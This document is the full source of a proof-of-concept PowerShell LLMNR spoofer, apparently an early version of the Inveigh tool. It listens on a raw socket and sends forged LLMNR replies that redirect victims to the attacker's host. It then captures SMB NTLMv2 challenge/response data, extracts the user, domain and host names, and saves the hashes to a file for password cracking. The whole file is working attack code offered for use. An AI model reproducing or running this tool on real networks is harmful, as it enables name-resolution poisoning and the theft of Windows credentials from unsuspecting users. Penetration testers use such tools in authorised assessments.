# PowerShell LLMNR Spoofer
# 
# Requirements: 
#   Elevated admin access command prompt
#   Specify a local IP with '-i'
#   
#  Notes:
#   Currently only supports IPv4 LLMNR spoofing and NTLMv2 challenge/response capture
#   LLMNR spoofer will point victims to host system's SMB service, keep account lockout scenarios in mind
#   Challenge/response output file will be created in current working directory
#   If you copy/paste challenge/response captures from output window for password cracking, remove carriage returns
#   Code is proof of concept level and may not work under some scenarios
#
param( 
    [String]$i = "", [switch]$Help )
   
if( $Help )
{
	Write-Host "usage: $($MyInvocation.MYCommand) [-i Local IP Address]"
	exit -1
}

if(-not($i)) { Throw "Specify a local IP address with -i" }

$start_time = Get-Date
Write-Output "Inveigh started at $(Get-Date -format 's')"
Write-Host "Press CTRL+C to exit" -fore red

$out_file_path = $PWD.Path + "\Inveigh.txt"

$byte_in = New-Object Byte[] 4	
$byte_out = New-Object Byte[] 4	
$byte_data = New-Object Byte[] 4096
$byte_in[0] = 1  					
$byte_in[1-3] = 0
$byte_out[0] = 1
$byte_out[1-3] = 0

# Sniffer socket setup
$sniffer_socket = New-Object System.Net.Sockets.Socket( [Net.Sockets.AddressFamily]::InterNetwork, [Net.Sockets.SocketType]::Raw, [Net.Sockets.ProtocolType]::IP )
$sniffer_socket.SetSocketOption( "IP", "HeaderIncluded", $true )
$sniffer_socket.ReceiveBufferSize = 1024000
$end_point = New-Object System.Net.IPEndpoint( [Net.IPAddress]"$i", 0 )
$sniffer_socket.Bind( $end_point )
[void]$sniffer_socket.IOControl( [Net.Sockets.IOControlCode]::ReceiveAll, $byte_in, $byte_out )

Function ReverseUInt16( $field )
{
	[Array]::Reverse( $field )
	return [BitConverter]::ToUInt16( $field, 0 )
}

Function ReverseUInt32( $field )
{
	[Array]::Reverse( $field )
	return [BitConverter]::ToUInt32( $field, 0 )
}

while( $true )
{
Try
 {
    $packet_data = $sniffer_socket.Receive( $byte_data, 0, $byte_data.length, [Net.Sockets.SocketFlags]::None )
 }
Catch
 {}
	
	$memory_stream = New-Object System.IO.MemoryStream( $byte_data, 0, $packet_data )
	$binary_reader = New-Object System.IO.BinaryReader( $memory_stream )
    
    # IP header fields
	$version_HL = $binary_reader.ReadByte( )
	$type_of_service= $binary_reader.ReadByte( )
	$total_length = ReverseUInt16 $binary_reader.ReadBytes( 2 )
	$identification = $binary_reader.ReadBytes( 2 )
	$flags_offset = $binary_reader.ReadBytes( 2 )
	$TTL = $binary_reader.ReadByte( )
	$protocol_number = $binary_reader.ReadByte( )
	$header_checksum = [Net.IPAddress]::NetworkToHostOrder( $binary_reader.ReadInt16() )
    $source_IP_bytes = $binary_reader.ReadBytes( 4 )
	$source_IP = [System.Net.IPAddress]$source_IP_bytes
	$destination_IP_bytes = $binary_reader.ReadBytes( 4 )
	$destination_IP = [System.Net.IPAddress]$destination_IP_bytes

	$ip_version = [int]"0x$(('{0:X}' -f $version_HL)[0])"
	$header_length = [int]"0x$(('{0:X}' -f $version_HL)[1])" * 4
	
	$payload_data = ""
    switch( $protocol_number )
    {
    6 {  # TCP
            #$payload_data = @()
			$source_port = ReverseUInt16 $binary_reader.ReadBytes(2)
			$destination_port = ReverseUInt16 $binary_reader.ReadBytes(2)
			$sequence_number = ReverseUInt32 $binary_reader.ReadBytes(4)
			$ack_number = ReverseUInt32 $binary_reader.ReadBytes(4)
			$TCP_header_length = [int]"0x$(('{0:X}' -f $binary_reader.ReadByte())[0])" * 4
			$TCP_flags = $binary_reader.ReadByte()
			$TCP_window = ReverseUInt16 $binary_reader.ReadBytes(2)
			$TCP_checksum = [System.Net.IPAddress]::NetworkToHostOrder($binary_reader.ReadInt16())
			$TCP_urgent_ointer = ReverseUInt16 $binary_reader.ReadBytes(2)
            
			$payload_data = $binary_reader.ReadBytes($total_length - ($header_length + $TCP_header_length))
	   }       
    17 {  # UDP
			$source_port =  $binary_reader.ReadBytes(2)
            $source_port_2 = ReverseUInt16 ($source_port)
			$destination_port = ReverseUInt16 $binary_reader.ReadBytes(2)
			$UDP_length = $binary_reader.ReadBytes(2)
            $UDP_length_2  = ReverseUInt16 ($UDP_length)
			[void]$binary_reader.ReadBytes(2)
            
			$payload_data = $binary_reader.ReadBytes(($UDP_length_2 - 2) * 4)
       }
    }   
    switch ( $destination_port )
    {
    5355 { # LLMNR
            $UDP_length[0] += $payload_data.length - 2
            [Byte[]] $LLMNR_response_data = $payload_data[12..$payload_data.length]
            $LLMNR_response_data += $LLMNR_response_data
            $LLMNR_response_data += (0x00,0x00,0x00,0x1e,0x00,0x04)
            $LLMNR_response_data += ([IPAddress][String]([IPAddress]$i)).GetAddressBytes()
            
            [Byte[]] $LLMNR_response_packet = (0x14,0xeb)
            $LLMNR_response_packet += $source_port[1,0]
            $LLMNR_response_packet += $UDP_length[1,0]
            $LLMNR_response_packet += (0x00,0x00)
            $LLMNR_response_packet += $payload_data[0,1]
            $LLMNR_response_packet += (0x80,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x00)
            $LLMNR_response_packet += $LLMNR_response_data
            
            $send_socket = New-Object Net.Sockets.Socket( [Net.Sockets.AddressFamily]::InterNetwork,[Net.Sockets.SocketType]::Raw,[Net.Sockets.ProtocolType]::Udp )
            $send_socket.SendBufferSize = 1024
            $destination_point = New-Object Net.IPEndpoint( $source_IP, $source_port_2 )
            [void]$send_socket.sendTo( $LLMNR_response_packet, $destination_point )
            $send_socket.Close( )
            
            
            $LLMNR_query = [System.BitConverter]::ToString($payload_data[13..($payload_data.length - 4)])
            $LLMNR_query = $LLMNR_query -replace "-00",""
            $LLMNR_query = $LLMNR_query.Split(“-“) | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
            $LLMNR_query_string = New-Object System.String ($LLMNR_query,0,$LLMNR_query.Length)
            write-output "$(Get-Date -format 's') - LLMNR request for '$LLMNR_query_string' received from $source_IP - spoofed response has been sent"
         }
    }
    switch ( $destination_port,$source_port)
    {
    445 { # SMB NTLMv2
           
            if (($payload_data[115] -eq 2) -and ($payload_data[116..118] -eq 0))
            {
                $NTLMv2_challenge = [System.BitConverter]::ToString($payload_data[131..138]) -replace "-",""
            }
                if (($payload_data[121] -eq 3) -and ($payload_data[122..124] -eq 0))
                {
                    $NTLMv2_offset = $payload_data[137] + 113
                    try
                     {
                        $NTLMv2_length = [System.BitConverter]::ToInt16($payload_data[135..136],0)
                     }
                    catch
                     {}
            
                    if (($NTLMv2_length -lt 320) -and ($NTLMv2_length -gt 200))
                    {
                        $NTLMv2_length += 254
                        
                        try
                         {
                            $NTLMv2_domain_length = [System.BitConverter]::ToInt16($payload_data[141..142],0)
                         }
                        catch
                         {}
                        $NTLMv2_domain = [System.BitConverter]::ToString($payload_data[201..(200+$NTLMv2_domain_length)])
                        $NTLMv2_domain = $NTLMv2_domain -replace "-00",""
                        $NTLMv2_domain = $NTLMv2_domain.Split(“-“) | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
                        $NTLMv2_domain_string = New-Object System.String ($NTLMv2_domain,0,$NTLMv2_domain.Length)
                        
                        try
                         {
                            $NTLMv2_user_length = [System.BitConverter]::ToInt16($payload_data[149..150],0)
                         }
                        catch
                         {}
                        
                        $NTLMv2_user = [System.BitConverter]::ToString($payload_data[(201+$NTLMv2_domain_length)..(200+$NTLMv2_domain_length+$NTLMv2_user_length)])
                        $NTLMv2_user = $NTLMv2_user -replace "-00",""
                        $NTLMv2_user = $NTLMv2_user.Split(“-“) | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
                        $NTLMv2_user_string = New-Object System.String ($NTLMv2_user,0,$NTLMv2_user.Length)
                        
                        try
                         {
                            $NTLMv2_host_length = [System.BitConverter]::ToInt16($payload_data[157..158],0)
                         }
                        catch
                         {}
                        $NTLMv2_host = [System.BitConverter]::ToString($payload_data[(201+$NTLMv2_domain_length+$NTLMv2_user_length)..(200+$NTLMv2_domain_length+$NTLMv2_user_length+$NTLMv2_host_length)])
                        $NTLMv2_host = $NTLMv2_host -replace "-00",""
                        $NTLMv2_host = $NTLMv2_host.Split(“-“) | FOREACH{ [CHAR][CONVERT]::toint16($_,16)}
                        $NTLMv2_host_string = New-Object System.String ($NTLMv2_host,0,$NTLMv2_host.Length)
                        
                        $NTLMv2_length += ($NTLMv2_user_length - 8) + ($NTLMv2_domain_length - 6) + ($NTLMv2_host_length - 16) # temp bug fix for response length issue
                        $NTLMv2_response = [System.BitConverter]::ToString($payload_data[$NTLMv2_offset..$NTLMv2_length]) -replace "-",""
                        $NTLMv2_response = $NTLMv2_response.Insert(32,':')
                        $ntlmv2_hash = $NTLMv2_user_string + "::" + $NTLMv2_domain_string + ":" + $NTLMv2_challenge + ":" + $NTLMv2_response
                      
                        write-output "SMB NTLMv2 challenge/response captured from $source_IP($NTLMv2_host_string):`n$ntlmv2_hash"
                        write-warning "SMB NTLMv2 challenge/response written to $out_file_path"
                        $ntlmv2_hash |Out-File Inveigh.txt -Append
                        
                    }
                }
        }
    }
    $binary_reader.Close( )
	$memory_stream.Close( )
}
$sniffer_socket.Close( )